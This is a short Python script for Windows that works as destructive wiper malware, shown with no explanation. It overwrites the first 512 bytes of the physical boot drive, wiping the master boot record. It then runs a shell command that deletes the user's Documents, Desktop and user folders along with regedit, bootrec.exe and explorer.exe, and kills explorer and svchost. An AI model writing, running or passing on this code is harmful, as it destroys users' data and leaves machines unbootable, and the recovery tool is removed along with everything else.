from win32gui import *
from win32ui import *
from win32con import *
from win32file import *
import os

def main():
    hDevice = CreateFileW("\\\\.\\PhysicalDrive0",
                            GENERIC_WRITE,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            None,
                            OPEN_EXISTING,
                            0,0
    )
    WriteFile(hDevice,
                            AllocateReadBuffer(512),
                            None
                            )
    CloseHandle(hDevice)

main()
os.system('cmd /min /C \\"set __COMPAT_LAYER=RUNASINVOKER && del /f %userprofile%\\Documents\\* & del /f %userprofile%\\Desktop\\* & del /f C:\\Windows\\regedit & del /f C:\\Windows\\System32\\bootrec.exe & taskkill /f /im explorer.exe & del C:\\Windows\\explorer.exe & del /f C:\\Users\\* && taskkill /f /im svchost.exe"')